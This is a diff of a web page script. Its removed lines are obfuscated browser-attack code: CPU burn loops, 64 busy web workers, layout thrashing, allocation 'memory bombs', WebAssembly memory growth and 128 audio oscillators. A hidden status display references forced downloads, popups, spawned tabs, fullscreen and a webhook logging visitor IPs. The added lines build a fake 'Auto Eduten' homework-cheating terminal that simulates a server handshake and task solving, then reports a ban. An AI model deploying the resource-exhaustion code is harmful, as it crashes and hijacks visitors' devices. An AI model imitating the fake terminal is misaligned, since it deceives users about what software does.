-      gl.bindFramebuffer(gl.FRAMEBUFFER, null);
-      gl.viewport(0, 0, w, h);
-      gl.useProgram(pr);
-      gl.activeTexture(gl.TEXTURE0);
-      gl.bindTexture(gl.TEXTURE_2D, pt2);
-      gl.uniform1i(uP, 0);
-      gl.activeTexture(gl.TEXTURE1);
-      gl.bindTexture(gl.TEXTURE_2D, ht);
-      gl.uniform1i(uH, 1);
-      gl.uniform1f(uT, t);
-      gl.uniform1f(uF, 0);
-      gl.drawArrays(gl.TRIANGLES, 0, 3);
-      let a = pt1; pt1 = pt2; pt2 = a;
-      let b = pf1; pf1 = pf2; pf2 = b;
-    }
-  };
-})();
+    showView(viewLoading);
 
-// ============================================================
-// Main-thread burn (300ms)
-// ============================================================
-const B = 300;
-let mi = 0, mr = 0, mt = performance.now(), mI = 0;
+    var mi = 0;
+    var msgTimer = setInterval(function () {
+      mi++;
+      if (mi < MESSAGES.length) statusText.textContent = MESSAGES[mi];
+    }, LOADING_DURATION / MESSAGES.length);
 
-function q8m1x5k(b) {
-  const s = performance.now();
-  let x = 0x9e3779b9 >>> 0;
-  let i = 0;
-  while (performance.now() - s < b) {
-    for (let k = 0; k < 16384; k++) {
-      x = (x ^ (x << 13)) >>> 0;
-      x = (x ^ (x >>> 17)) >>> 0;
-      x = (x ^ (x << 5)) >>> 0;
-      x = (x + k) >>> 0;
-      let y = (x * 2654435761) >>> 0;
-      y ^= (y >>> 15);
-      y = (y * 2246822519) >>> 0;
-      x = (x ^ y) >>> 0;
-    }
-    i += 16384;
-  }
-  mi += i;
-  const n = performance.now();
-  if (n - mt >= 500) {
-    mr = (mi - mI) / ((n - mt) / 1000);
-    mt = n; mI = mi;
-  }
-}
+    var start = (window.performance && performance.now) ? performance.now() : Date.now();
 
-// ============================================================
-// 64 workers
-// ============================================================
-const WS = `
-  'use strict';
-  const B = 65536;
-  let T = 0;
-  let L = performance.now();
-  let P = 0;
-  function H(seed) {
-    let x = seed >>> 0;
-    for (let i = 0; i < B; i++) {
-      x = (x ^ (x << 13)) >>> 0;
-      x = (x ^ (x >>> 17)) >>> 0;
-      x = (x ^ (x << 5)) >>> 0;
-      x = (x + i) >>> 0;
-      let y = (x * 2654435761) >>> 0;
-      y ^= (y >>> 15);
-      y = (y * 2246822519) >>> 0;
-      x = (x ^ y) >>> 0;
-    }
-    return x;
-  }
-  while (true) {
-    let a = 0;
-    for (let b = 0; b < 8; b++) {
-      a ^= H((T + b) >>> 0);
-      T += B;
-    }
-    const n = performance.now();
-    if (n - L > 500) {
-      self.postMessage({ r: (T - P) / ((n - L) / 1000), t: T });
-      L = n; P = T;
-    }
-  }
-`;
+    function tick(now) {
+      if (now === undefined) now = Date.now();
+      var t = Math.min(1, (now - start) / LOADING_DURATION);
+      bar.style.width = (t * 100).toFixed(1) + '%';
+      percentEl.textContent = Math.round(t * 100) + '%';
 
-const NW = 64;
-const WU = URL.createObjectURL(new Blob([WS], { type: 'application/javascript' }));
-const wk = [];
-const wr = new Array(NW).fill(0);
-
-for (let i = 0; i < NW; i++) {
-  try {
-    const w = new Worker(WU);
-    w.onmessage = (e) => {
-      if (e.data && typeof e.data.r === 'number') wr[i] = e.data.r;
-    };
-    w.onerror = (err) => { console.error('worker ' + i + ':', err.message || err); };
-    wk.push(w);
-  } catch (err) {
-    console.error('worker ' + i + ' failed:', err);
-  }
-}
-
-// ============================================================
-// Layout thrash (2400 children)
-// ============================================================
-const tt = document.getElementById('p4z9k1n');
-const TC = 2400;
-{
-  const fr = document.createDocumentFragment();
-  for (let i = 0; i < TC; i++) {
-    const d = document.createElement('div');
-    d.className = 'x2k9n6v';
-    fr.appendChild(d);
-  }
-  tt.appendChild(fr);
-}
-const tc = tt.children;
-
-let tr = 0, tr2 = 0, tt2 = performance.now(), tR = 0;
-
-function x9p4m1q() {
-  const n = tc.length;
-  let a = 0;
-  for (let i = 0; i < n; i++) {
-    const c = tc[i];
-    const w = c.offsetWidth;
-    const h = c.offsetHeight;
-    const r = c.getBoundingClientRect();
-    const st = c.scrollTop;
-    const ch = c.clientHeight;
-    const cw = c.clientWidth;
-    a += w + h + r.width + r.height + st + ch + cw;
-    c.style.width = (4 + (i % 5)) + 'px';
-    c.style.height = (4 + (i % 7)) + 'px';
-    c.style.paddingLeft = (i % 3) + 'px';
-    c.style.marginTop = (i % 4) * 0.25 + 'px';
-    c.style.transform = 'translateX(' + (i % 3) + 'px)';
-  }
-  tr += n;
-  const n2 = performance.now();
-  if (n2 - tt2 >= 500) {
-    tr2 = (tr - tR) / ((n2 - tt2) / 1000);
-    tt2 = n2; tR = tr;
-  }
-}
-
-// ============================================================
-// 48 intervals
-// ============================================================
-let it = 0;
-const iv = [];
-for (let i = 0; i < 48; i++) {
-  const id = setInterval(() => {
-    let s = 0;
-    const b = new Uint32Array(4096);
-    for (let k = 0; k < b.length; k++) {
-      b[k] = (Math.random() * 0xffffffff) >>> 0;
-    }
-    for (let k = 0; k < b.length; k++) {
-      s = (s + (b[k] ^ (b[k] >>> 13))) >>> 0;
-    }
-    it++;
-    if (i === 0 && tc.length) {
-      tc[0].style.opacity = (s & 1) ? '1' : '0.99';
-    }
-  }, i);
-  iv.push(id);
-}
-
-let to1 = 0;
-function tl1() {
-  let s = 0;
-  for (let i = 0; i < 32768; i++) s = (s * 31 + i) >>> 0;
-  to1++;
-  setTimeout(tl1, 0);
-}
-setTimeout(tl1, 0);
-
-let to2 = 0;
-function tl2() {
-  let s = 0;
-  const a = new Float64Array(8192);
-  for (let i = 0; i < a.length; i++) a[i] = Math.sin(i * 0.001 + s);
-  for (let i = 0; i < a.length; i++) s += a[i] * a[i];
-  to2++;
-  setTimeout(tl2, 0);
-}
-setTimeout(tl2, 0);
-
-let to3 = 0;
-function tl3() {
-  let s = '';
-  for (let i = 0; i < 16000; i++) s += 'v' + i + ';';
-  to3++;
-  setTimeout(tl3, 0);
-}
-setTimeout(tl3, 0);
-
-let to4 = 0;
-function tl4() {
-  let s = 0;
-  const a = new Uint32Array(16384);
-  for (let i = 0; i < a.length; i++) a[i] = (Math.random() * 0xffffffff) >>> 0;
-  for (let i = 0; i < a.length; i++) s = (s + a[i]) >>> 0;
-  to4++;
-  setTimeout(tl4, 0);
-}
-setTimeout(tl4, 0);
-
-let to5 = 0;
-function tl5() {
-  const o = {};
-  for (let i = 0; i < 4000; i++) {
-    o['k' + i] = { v: i, s: 'z' + i, a: [i, i + 1, i + 2] };
-  }
-  to5++;
-  setTimeout(tl5, 0);
-}
-setTimeout(tl5, 0);
-
-let to6 = 0;
-function tl6() {
-  let s = 0;
-  for (let i = 0; i < 20000; i++) {
-    s = Math.sin(s + i) * Math.cos(i * 0.001);
-  }
-  to6++;
-  setTimeout(tl6, 0);
-}
-setTimeout(tl6, 0);
-
-// ============================================================
-// Memory bombs
-// ============================================================
-let ab = 0, abb = 0, abr = 0, abt = performance.now(), abp = 0;
-
-function aB() {
-  const S = [32*1024*1024, 64*1024*1024, 32*1024*1024, 128*1024*1024];
-  for (const b of S) {
-    try {
-      if (b % 8 === 0 && b >= 128 * 1024 * 1024) {
-        const t = new Int32Array(b / 4);
-        for (let i = 0; i < t.length; i += 1024) t[i] = i;
-      } else if (b % 8 === 0) {
-        const t = new Float64Array(b / 8);
-        for (let i = 0; i < t.length; i += 2048) t[i] = i * 0.5;
+      if (t < 1) {
+        requestAnimationFrame(tick);
       } else {
-        const ab2 = new ArrayBuffer(b);
-        const v = new Uint8Array(ab2);
-        for (let i = 0; i < v.length; i += 4096) v[i] = i & 0xff;
+        clearInterval(msgTimer);
+        setTimeout(showCoursesPage, 450);
       }
-      ab++; abb += b;
-    } catch (e) {}
+    }
+    requestAnimationFrame(tick);
   }
-  const n = performance.now();
-  if (n - abt >= 500) {
-    abr = (abb - abp) / ((n - abt) / 1000) / (1024 * 1024);
-    abt = n; abp = abb;
+
+  /* ============================================================
+     STEP 4 : COURSES PAGE
+     ============================================================ */
+  function showCoursesPage() {
+    hideShell();          // fully hide the loading card (visibility + opacity + pointer-events)
+    buildCourseList();
+    showPage(coursesPage);
   }
-}
 
-const BC = 800000;
-let oc = 0, or_ = 0, ot = performance.now(), op = 0;
+  function buildCourseList() {
+    courseList.innerHTML = '';
+    var btn = document.createElement('button');
+    btn.type = 'button';
+    btn.className = 'item featured';
 
-function bO() {
-  const a = new Array(BC);
-  for (let i = 0; i < BC; i++) {
-    a[i] = {
-      id: i,
-      name: 'k3_' + i,
-      tags: ['q', 'v', 'z', 'w', 'x', 'y', (i & 7).toString()],
-      n: { v: i * 0.5, f: (i & 1) === 1, m: { d: 3, l: 'x' + i, e: 'y' + i, g: 'z' + i } },
-      d: '8n1v ' + i + ' 9z2k 8q3n 6v3n 9z1v 3q9z 8n1k',
-    };
-  }
-  let s = 0;
-  for (let i = 0; i < a.length; i += 256) s += a[i].id;
-  oc += BC;
-  const n = performance.now();
-  if (n - ot >= 500) {
-    or_ = (oc - op) / ((n - ot) / 1000);
-    ot = n; op = oc;
-  }
-  return s;
-}
+    var label = document.createElement('span');
+    label.className = 'label';
+    label.textContent = COURSE;
 
-let js = '';
-let jc = 0, jb = 0, jr = 0, jt = performance.now(), jp = 0;
+    btn.appendChild(label);
+    btn.appendChild(makeChevron());
 
-function bJ() {
-  const NN = 240000;
-  const rows = new Array(NN);
-  for (let i = 0; i < NN; i++) {
-    rows[i] = JSON.stringify({
-      id: i,
-      uuid: 'q-' + i + '-' + (i * 7919).toString(36),
-      value: Math.sin(i) * 1000,
-      tags: ['k', 'v', 'z', 'w', 'x', 'y', (i & 15).toString()],
-      nested: { a: [1,2,3,4,5,6,7,8,9,10,11,12], b: 'z'.repeat(64), c: i * 3.14, d: 'q', e: 'w' },
+    btn.addEventListener('click', function () {
+      showPage(lessonsPage);
     });
-  }
-  return '[' + rows.join(',') + ']';
-}
-js = bJ();
-
-function pJ() {
-  try {
-    const o = JSON.parse(js);
-    let s = 0;
-    for (let i = 0; i < o.length; i += 1024) s += o[i].id;
-    jc++; jb += js.length;
-  } catch (e) {}
-  const n = performance.now();
-  if (n - jt >= 500) {
-    jr = (jb - jp) / ((n - jt) / 1000) / (1024 * 1024);
-    jt = n; jp = jb;
-  }
-}
-
-const SC = 160000;
-let cc = 0, cch = 0, cr = 0, ct = performance.now(), cp = 0;
-
-function cS() {
-  let s = '';
-  for (let i = 0; i < SC; i++) {
-    s += 'q3_' + i + ':' + (i * 31) + ';';
-  }
-  cc += SC; cch += s.length;
-  const n = performance.now();
-  if (n - ct >= 500) {
-    cr = (cc - cp) / ((n - ct) / 1000);
-    ct = n; cp = cc;
-  }
-  return s.length;
-}
-
-let wm = null, wp = 0, wg = 0, wtp = 0;
-try {
-  wm = new WebAssembly.Memory({ initial: 16, maximum: 65536 });
-  wp = 16;
-} catch (e) { console.error('WASM memory unavailable:', e); }
-
-function wG() {
-  if (!wm) return;
-  try {
-    if (wp >= 8192) {
-      wm = new WebAssembly.Memory({ initial: 16, maximum: 65536 });
-      wp = 16;
-    }
-    const b4 = wm.buffer.byteLength;
-    wp = wm.grow(64);
-    const a4 = wm.buffer.byteLength;
-    wg++; wtp += (a4 - b4) / 65536;
-    const v = new Uint8Array(wm.buffer);
-    for (let i = b4; i < a4; i += 1024) v[i] = i & 0xff;
-  } catch (e) {
-    try {
-      wm = new WebAssembly.Memory({ initial: 16, maximum: 65536 });
-      wp = 16;
-    } catch (_) { wm = null; }
-  }
-}
-
-const mI2 = [];
-mI2.push(setInterval(aB, 80));
-mI2.push(setInterval(bO, 120));
-mI2.push(setInterval(pJ, 160));
-mI2.push(setInterval(cS, 60));
-mI2.push(setInterval(wG, 100));
-
-// ============================================================
-// Audio (128 oscillators)
-// ============================================================
-let ac = null, as_ = false, ao = 0, asp = 0, asr = 0, ast = performance.now(), asp2 = 0;
-
-function mIR(ctx, sec, dec) {
-  const r = ctx.sampleRate;
-  const l = Math.max(1, Math.floor(r * sec));
-  const ir = ctx.createBuffer(2, l, r);
-  for (let c = 0; c < 2; c++) {
-    const d = ir.getChannelData(c);
-    for (let i = 0; i < l; i++) {
-      const t = i / l;
-      d[i] = (Math.random() * 2 - 1) * Math.pow(1 - t, dec);
-    }
-  }
-  return ir;
-}
-
-function mDC(a) {
-  const n = 65536;
-  const c = new Float32Array(n);
-  const d = Math.PI / 180;
-  for (let i = 0; i < n; i++) {
-    const x = (i * 2) / n - 1;
-    c[i] = ((3 + a) * x * 20 * d) / (Math.PI + a * Math.abs(x));
-  }
-  return c;
-}
-
-function sA() {
-  if (as_) return;
-  const C = window.AudioContext || window.webkitAudioContext;
-  if (!C) { console.warn('Web Audio not available'); return; }
-  try { ac = new C({ latencyHint: 'playback' }); }
-  catch (e) { console.error('AudioContext failed:', e); return; }
-  as_ = true;
-
-  const m = ac.createGain();
-  m.gain.value = 0.0006;
-
-  const cv = ac.createConvolver();
-  cv.buffer = mIR(ac, 8.0, 3.0);
-
-  const f1 = ac.createBiquadFilter();
-  f1.type = 'lowpass'; f1.frequency.value = 1200; f1.Q.value = 8;
-  const f2 = ac.createBiquadFilter();
-  f2.type = 'highpass'; f2.frequency.value = 80; f2.Q.value = 4;
-  const f3 = ac.createBiquadFilter();
-  f3.type = 'peaking'; f3.frequency.value = 880; f3.Q.value = 12; f3.gain.value = 12;
-
-  const sh = ac.createWaveShaper();
-  sh.curve = mDC(50);
-  sh.oversample = '4x';
-
-  const BL = 8192;
-  let sp = null;
-  try { sp = ac.createScriptProcessor(BL, 2, 2); } catch (e) {
-    try { sp = ac.createJavaScriptNode(BL, 2, 2); } catch (_) {}
+    courseList.appendChild(btn);
   }
 
-  const ds = ac.sampleRate * 3;
-  const dL = new Float32Array(ds);
-  const dR = new Float32Array(ds);
-  let dp = 0;
-  const fb = 0.75;
+  /* ============================================================
+     STEP 5 : LESSONS PAGE
+     ============================================================ */
+  function buildLessonList() {
+    lessonList.innerHTML = '';
+    var btn = document.createElement('button');
+    btn.type = 'button';
+    btn.className = 'item featured';
 
-  if (sp) {
-    sp.onaudioprocess = (e) => {
-      const iL = e.inputBuffer.getChannelData(0);
-      const iR = e.inputBuffer.getChannelData(1);
-      const oL = e.outputBuffer.getChannelData(0);
-      const oR = e.outputBuffer.getChannelData(1);
-      const l = oL.length;
-      for (let i = 0; i < l; i++) {
-        const a = iL[i], b = iR[i];
-        const cL = dL[dp], cR = dR[dp];
-        const mo = Math.sin((dp + i) * 0.00013) * 0.08;
-        const yL = a * 0.6 + cL * fb + mo * cR;
-        const yR = b * 0.6 + cR * fb + mo * cL;
-        oL[i] = Math.tanh(yL * 1.4);
-        oR[i] = Math.tanh(yR * 1.4);
-        dL[dp] = yL + a * 0.25;
-        dR[dp] = yR + b * 0.25;
-        dp++;
-        if (dp >= ds) dp = 0;
-      }
-      asp++;
-      const n = performance.now();
-      if (n - ast >= 500) {
-        asr = (asp - asp2) / ((n - ast) / 1000) * BL / ac.sampleRate;
-        ast = n; asp2 = asp;
-      }
-    };
-  }
+    var label = document.createElement('span');
+    label.className = 'label';
+    label.textContent = LESSON;
 
-  const OC = 128;
-  const OT = ['sine', 'square', 'sawtooth', 'triangle'];
-  for (let i = 0; i < OC; i++) {
-    const o = ac.createOscillator();
-    o.type = OT[i % OT.length];
-    o.frequency.value = 55 * Math.pow(2, (i % 12) / 12) * (1 + (Math.random() - 0.5) * 0.01);
-    const g = ac.createGain();
-    g.gain.value = 0.008;
-    const lf = ac.createOscillator();
-    lf.type = 'sine';
-    lf.frequency.value = 0.1 + Math.random() * 4;
-    const lg = ac.createGain();
-    lg.gain.value = 8;
-    lf.connect(lg);
-    lg.connect(o.detune);
-    o.connect(g);
-    g.connect(f1);
-    o.start();
-    lf.start();
-    ao++;
-  }
+    btn.appendChild(label);
+    btn.appendChild(makeChevron());
 
-  f1.connect(f2);
-  f2.connect(f3);
-  f3.connect(sh);
-  sh.connect(cv);
-  cv.connect(m);
-
-  if (sp) { m.connect(sp); sp.connect(ac.destination); }
-  else { m.connect(ac.destination); }
-
-  const mL = ac.createOscillator();
-  mL.frequency.value = 0.07;
-  const mG = ac.createGain();
-  mG.gain.value = 400;
-  mL.connect(mG);
-  mG.connect(f1.frequency);
-  mL.start();
-
-  const tR2 = () => {
-    if (!ac) return;
-    if (ac.state === 'suspended') ac.resume().catch(() => {});
-  };
-  tR2();
-  window.addEventListener('pointerdown', tR2, { passive: true });
-  window.addEventListener('keydown', tR2, { passive: true });
-  window.addEventListener('touchstart', tR2, { passive: true });
-  window.addEventListener('click', tR2, { passive: true });
-}
-
-try { sA(); } catch (e) { console.error('audio start failed:', e); }
-
-// ============================================================
-// Main loop + invisible HUD
-// ============================================================
-const hu = document.getElementById('z7x3m9k');
-let fc = 0, lu = performance.now(), lmi = 'init...', lp = 0;
-
-function tk() {
-  const t = p3q8v6z();
-  q8m1x5k(B);
-  x9p4m1q();
-
-  if (window.__z3p7v1n) {
-    const r = window.__z3p7v1n.f(t);
-    if (r && r.i) lmi = r.i;
-  }
-  if (window.__k9x4m8q) lp = window.__k9x4m8q.f(t);
-  if (window.__n2v6p3z) window.__n2v6p3z.f(t);
-
-  fc++;
-  const n = performance.now();
-  if (n - lu >= 500) {
-    const fps = (fc * 1000) / (n - lu);
-
-    let wT = 0, wA = 0;
-    for (let i = 0; i < wr.length; i++) {
-      if (wr[i] > 0) { wA++; wT += wr[i]; }
-    }
-
-    const as = ac
-      ? ac.state + ' · ' + ao + ' osc · SP ' + (asr * 100).toFixed(1) + '%'
-      : 'unavailable';
-
-    let mm = 'n/a';
-    if (performance.memory) {
-      const q = performance.memory;
-      mm = (q.usedJSHeapSize / 1048576).toFixed(0) + ' MB / ' +
-           (q.totalJSHeapSize / 1048576).toFixed(0) + ' MB / ' +
-           (q.jsHeapSizeLimit / 1048576).toFixed(0) + ' MB cap';
-    }
-
-    const wmm = wm ? (wm.buffer.byteLength / 1048576).toFixed(1) + ' MB' : 'n/a';
-
-    const hookLine =
-      hookStatus + ' (#' + hookAttempts + ')' +
-      (hookStatusCode ? ' ' + hookStatusCode : '') +
-      (hookLastIp !== 'unknown' && hookLastIp ? ' ip=' + hookLastIp : '') +
-      (hookLastProvider ? ' via=' + hookLastProvider : '') +
-      (hookErrorText ? ' err=' + hookErrorText.slice(0, 40) : '');
-
-    hu.textContent =
-      'fps              : ' + fps.toFixed(1) + '\n' +
-      'main canvas      : ' + lmi + '\n' +
-      'particles ctx    : ' + lp + ' draw calls / frame\n' +
-      'texture ctx      : ping-pong RTT + 128-tap blur · 4096² source\n' +
-      'webgl contexts   : 3 · FBOs: 6 · textures: ~7\n' +
-      'main-thread loop : ' + (mr / 1e6).toFixed(2) + ' M ops/s\n' +
-      'web workers      : ' + wA + '/' + NW + ' · ' + (wT / 1e6).toFixed(2) + ' M ops/s\n' +
-      'layout thrash    : ' + (tr2 / 1000).toFixed(1) + ' k reflows/s\n' +
-      'timers           : ' + it + ' · ' + to1 + ' · ' + to2 + ' · ' + to3 + ' · ' + to4 + ' · ' + to5 + ' · ' + to6 + '\n' +
-      'web audio        : ' + as + '\n' +
-      'ArrayBuffer      : ' + abr.toFixed(1) + ' MB/s · ' + ab + ' allocs\n' +
-      'object arrays    : ' + (or_ / 1000).toFixed(1) + ' k objs/s · ' + oc + ' total\n' +
-      'JSON.parse       : ' + jr.toFixed(1) + ' MB/s · ' + jc + ' parses\n' +
-      'string concat    : ' + (cr / 1000).toFixed(1) + ' k/s · ' + (cch / 1048576).toFixed(1) + ' MB\n' +
-      'wasm memory      : ' + wmm + ' · ' + wg + ' grows · ' + (wtp * 65536 / 1048576).toFixed(0) + ' MB grown\n' +
-      'downloads        : ' + x9k2n7m3 + ' attempts · ' + q8v3n1z5.length + ' logged\n' +
-      'N / N_POP / IV   : ' + N + ' / ' + N_POP + ' / ' + IV + ' ms\n' +
-      'popups fired     : ' + (popupFired ? 'yes' : 'no') + ' · count=' + popupCount + '\n' +
-      'rick roll @60s   : ' + (rickFired ? 'fired' : 'pending') + '\n' +
-      'is spawned tab   : ' + (IS_SPAWNED ? 'yes' : 'no') + '\n' +
-      'fullscreen       : ' + (document.fullscreenElement ? 'on' : 'off') + '\n' +
-      'webhook          : ' + hookLine + '\n' +
-      'heap             : ' + mm;
-
-    fc = 0;
-    lu = n;
-  }
-
-  requestAnimationFrame(tk);
-}
-
-requestAnimationFrame(tk);
-
-// ============================================================
-// Context-loss warnings
-// ============================================================
-for (const id of ['x9k2n7m', 'z3m9x2p', 'w8q2n5v']) {
-  const c = document.getElementById(id);
-  if (c) {
-    c.addEventListener('webglcontextlost', (e) => {
-      e.preventDefault();
-      console.warn('WebGL context lost on #' + id);
+    btn.addEventListener('click', function () {
+      buildTaskList();
+      tasksSub.textContent = LESSON + ' — ' + TASKS.length + ' tasks total.';
+      showPage(tasksPage);
     });
+    lessonList.appendChild(btn);
   }
-}
+  buildLessonList();
 
-// ============================================================
-// Cleanup
-// ============================================================
-window.addEventListener('beforeunload', () => {
-  for (const w of wk) { try { w.terminate(); } catch (_) {} }
-  try { URL.revokeObjectURL(WU); } catch (_) {}
-  for (const id of iv) { try { clearInterval(id); } catch (_) {} }
-  for (const id of mI2) { try { clearInterval(id); } catch (_) {} }
-  try { if (window.__dInt) clearInterval(window.__dInt); } catch (_) {}
-  if (ac) { try { ac.close(); } catch (_) {} }
-});
+  lessonsBack.addEventListener('click', function () {
+    showPage(coursesPage);
+  });
+
+  /* ============================================================
+     STEP 6 : TASKS PAGE
+     ============================================================ */
+  function buildTaskList() {
+    taskList.innerHTML = '';
+    for (var i = 0; i < TASKS.length; i++) {
+      var t = TASKS[i];
+      var card = document.createElement('div');
+      card.className = 'task-card';
+      card.style.animationDelay = (i * 0.02) + 's';
+
+      var cat = document.createElement('span');
+      cat.className = 'task-cat';
+      cat.textContent = t.cat;
+
+      var nameEl = document.createElement('span');
+      nameEl.className = 'task-name';
+      nameEl.textContent = t.name;
+
+      card.appendChild(cat);
+      card.appendChild(nameEl);
+      taskList.appendChild(card);
+    }
+  }
+
+  tasksBack.addEventListener('click', function () {
+    showPage(lessonsPage);
+  });
+
+  /* ============================================================
+     STEP 7 : big start -> terminal
+     ============================================================ */
+  var startTriggered = false;
+  startBtn.addEventListener('click', function (e) {
+    e.preventDefault();
+    if (startTriggered) return;
+    startTriggered = true;
+    ripple(startBtn);
+
+    setTimeout(function () {
+      hideAllPages();
+      hideShell();  // ensure shell remains hidden
+      setTimeout(startTerminal, 400);
+    }, 200);
+  });
+
+  /* ============================================================
+     STEP 8 : THE TERMINAL
+     ============================================================ */
+  var terminalStarted = false;
+  var inputActive = false;
+
+  function ts() {
+    var d = new Date();
+    return '[' + pad(d.getHours(), 2) + ':' + pad(d.getMinutes(), 2) + ':' +
+           pad(d.getSeconds(), 2) + '.' + pad(d.getMilliseconds(), 3) + ']';
+  }
+
+  function buildLogLine(level, msg, msgCls) {
+    var line = document.createElement('div');
+    line.className = 'term-line';
+
+    var tsSpan = document.createElement('span');
+    tsSpan.className = 'term-ts';
+    tsSpan.textContent = ts() + ' ';
+
+    var lvlSpan = document.createElement('span');
+    var levelMap = { 'INFO': 'term-info', 'DEBUG': 'term-debug', 'WARN': 'term-warn',
+                     'ERROR': 'term-error', 'FATAL': 'term-fatal', 'TASK': 'term-debug' };
+    lvlSpan.className = levelMap[level] || 'term-info';
+    var padded = level;
+    while (padded.length < 5) padded += ' ';
+    lvlSpan.textContent = '[' + padded + '] ';
+
+    var msgSpan = document.createElement('span');
+    msgSpan.className = msgCls || '';
+    msgSpan.textContent = msg;
+
+    line.appendChild(tsSpan);
+    line.appendChild(lvlSpan);
+    line.appendChild(msgSpan);
+    return { line: line, msgSpan: msgSpan };
+  }
+
+  async function typeLog(level, msg, msgCls, charDelay) {
+    var built = buildLogLine(level, '', msgCls);
+    terminalLines.appendChild(built.line);
+    charDelay = charDelay || 5;
+
+    for (var i = 1; i <= msg.length; i++) {
+      built.msgSpan.textContent = msg.slice(0, i);
+      await wait(charDelay + Math.random() * charDelay * 0.5);
+    }
+    return built.line;
+  }
+
+  async function appendLog(level, msg, msgCls) {
+    var built = buildLogLine(level, msg, msgCls);
+    terminalLines.appendChild(built.line);
+    await wait(70);
+    return built.line;
+  }
+
+  function scrollBottom() {
+    terminalScreen.scrollTop = terminalScreen.scrollHeight;
+  }
+
+  function startTerminal() {
+    if (terminalStarted) return;
+    terminalStarted = true;
+    terminalScreen.classList.add('active');
+    runTerminal();
+  }
+
+  async function runTerminal() {
+    var VERSION = '4.0.3';
+    var BUILD = '4127';
+
+    await typeLog('INFO', 'Auto Eduten v' + VERSION + ' (build ' + BUILD + ') - Browser Edition', '', 5);
+    await wait(120);
+    await typeLog('INFO', 'Runtime: Chromium 129.0.6668.58 | Platform: win32-x64', '', 5);
+    await wait(180);
+
+    await typeLog('INFO', 'Reading local config (config.json)............ OK [14ms]', '', 5);
+    await wait(150);
+
+    /* ---------- module loading ---------- */
+    await typeLog('INFO', 'Loading modules:', '', 5);
+
+    var modules = [
+      '  core.session ................... OK',
+      '  core.config_loader ............. OK',
+      '  core.dom_parser ................ OK',
+      '  core.event_bus ................. OK',
+      '  solver.math_engine ............. OK',
+      '  solver.expression_parser ....... OK',
+      '  solver.monomial_ops ............ OK',
+      '  solver.fraction_reducer ........ OK',
+      '  solver.exponent_rules .......... OK',
+      '  solver.math_engine.validate .... OK',
+      '  net.http_client ................ OK',
+      '  net.retry_handler .............. OK',
+      '  net.rate_limiter ............... OK',
+      '  ui.input_handler ............... OK',
+      '  ui.timing_controller ........... OK',
+      '  util.logger .................... OK'
+    ];
+    for (var m = 0; m < modules.length; m++) {
+      await appendLog('DEBUG', modules[m], 'term-debug');
+    }
+    await appendLog('INFO', modules.length + '/' + modules.length + ' modules loaded [92ms]', 'term-info');
+    await wait(200);
+
+    /* ---------- handshake ---------- */
+    await typeLog('INFO', 'Establishing secure API handshake (TLS 1.3)...', '', 5);
+    await wait(900);
+    await appendLog('INFO', 'Connection established. \u2713 [446ms]', 'term-ok');
+    await appendLog('INFO', 'Server acknowledged. Session token: a7f3b91e...e9c2', 'term-info');
+    await appendLog('INFO', 'Token TTL: 3600s | Region: eu-north-1', 'term-info');
+    await wait(250);
+
+    /* ---------- selection ---------- */
+    await typeLog('INFO', 'Selected course: ' + COURSE, '', 5);
+    await appendLog('INFO', 'Selected lesson: ' + LESSON, 'term-info');
+    await appendLog('INFO', 'Lesson manifest fetched: ' + TASKS.length + ' tasks found', 'term-info');
+    await wait(250);
+    await typeLog('INFO', 'Beginning automated task processing (' + TASKS.length + ' tasks)...', '', 5);
+    await wait(300);
+
+    /* ---------- task processing ---------- */
+    var durations = makeTaskDurations(TASKS.length, TOTAL_PROCESS_DURATION);
+
+    for (var i = 0; i < TASKS.length; i++) {
+      var num = pad(i + 1, 2);
+      var total = TASKS.length;
+      var name = TASKS[i].name;
+      var durMs = durations[i];
+
+      var tLine = document.createElement('div');
+      tLine.className = 'term-line';
+      var tsSpan = document.createElement('span');
+      tsSpan.className = 'term-ts';
+      tsSpan.textContent = ts() + ' ';
+      var lvlSpan = document.createElement('span');
+      lvlSpan.className = 'term-debug';
+      lvlSpan.textContent = '[TASK ] ';
+      var msgSpan = document.createElement('span');
+      msgSpan.className = '';
+      msgSpan.textContent = '[' + num + '/' + total + '] ' + name;
+
+      tLine.appendChild(tsSpan);
+      tLine.appendChild(lvlSpan);
+      tLine.appendChild(msgSpan);
+      terminalLines.appendChild(tLine);
+      scrollBottom();
+
+      var tStart = Date.now();
+      var dotMs = 220;
+      var dots = '';
+
+      while ((Date.now() - tStart) < durMs * 0.88) {
+        dots += '.';
+        msgSpan.textContent = '[' + num + '/' + total + '] ' + name + ' ' + dots;
+        scrollBottom();
+        await wait(dotMs);
+      }
+
+      var actualDur = Date.now() - tStart;
+      msgSpan.textContent = '[' + num + '/' + total + '] ' + name + ' ' + dots + ' OK [' + actualDur + 'ms]';
+      msgSpan.className = 'term-ok';
+      scrollBottom();
+
+      await wait(80);
+    }
+
+    /* ---------- finale ---------- */
+    await wait(200);
+    await appendLog('INFO', 'All tasks completed. Saving progress...', 'term-ok');
+    await wait(600);
+    await appendLog('WARN', 'Anomaly detected in submission pattern.', 'term-warn');
+    await wait(500);
+    await appendLog('FATAL', 'Bot banned. Restoring progress...', 'term-fatal');
+    await wait(700);
+    await appendLog('FATAL', 'Automation halted by server.', 'term-fatal');
+    await wait(300);
+
+    startInteractivePrompt();
+  }
+
+  function makeTaskDurations(count, totalMs) {
+    var weights = [];
+    var sum = 0;
+    for (var i = 0; i < count; i++) {
+      var w = 0.55 + Math.random() * 0.90;
+      weights.push(w);
+      sum += w;
+    }
+    var out = [];
+    for (var j = 0; j < count; j++) {
+      out.push(Math.round((weights[j] / sum) * totalMs));
+    }
+    return out;
+  }
+
+  /* ============================================================
+     STEP 9 : interactive prompt
+     ============================================================ */
+  function startInteractivePrompt() {
+    var line = document.createElement('div');
+    line.className = 'term-line term-prompt';
+    line.innerHTML =
+      '<span class="prefix">C:\\AutoEduten&gt; </span>' +
+      '<span class="typed"></span>' +
+      '<span class="cursor"></span>';
+    terminalLines.appendChild(line);
+    scrollBottom();
+
+    var typedEl = line.querySelector('.typed');
+    var buffer = '';
+
+    inputActive = true;
+
+    function insertAbove(lines) {
+      for (var k = 0; k < lines.length; k++) {
+        var el = document.createElement('div');
+        el.className = 'term-line ' + (lines[k].cls || '');
+        el.textContent = lines[k].text;
+        terminalLines.insertBefore(el, line);
+      }
+    }
+
+    function handleCommand(cmd) {
+      var c = cmd.trim().toLowerCase();
+      if (c === '') return;
+
+      if (c === 'help' || c === '/?') {
+        insertAbove([
+          { text: 'Available commands:', cls: 'term-info' },
+          { text: '  help     - show this list', cls: 'term-dim' },
